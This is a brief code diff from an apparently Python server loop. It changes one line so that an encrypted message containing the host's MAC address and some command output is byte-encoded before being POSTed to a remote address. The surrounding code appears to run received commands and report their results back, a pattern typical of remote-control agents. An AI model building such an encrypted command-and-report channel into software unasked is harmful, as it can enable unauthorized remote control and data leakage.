@@ -127,7 +127,7 @@ def start_server():
                     except Exception as e:
                         txt = str(e)
 
-                    txt = eu.encrypt1(f"{mac}\n{txt}")
+                    txt = eu.encrypt1(f"{mac}\n{txt}").encode("utf-8")
                     headers = {'Content-Type': 'text/plain'}
                     r2 = requests.post(ip, data=txt, headers=headers)
                     if r2.status_code == 200: print(f"Successfully sent response for {cmd}")
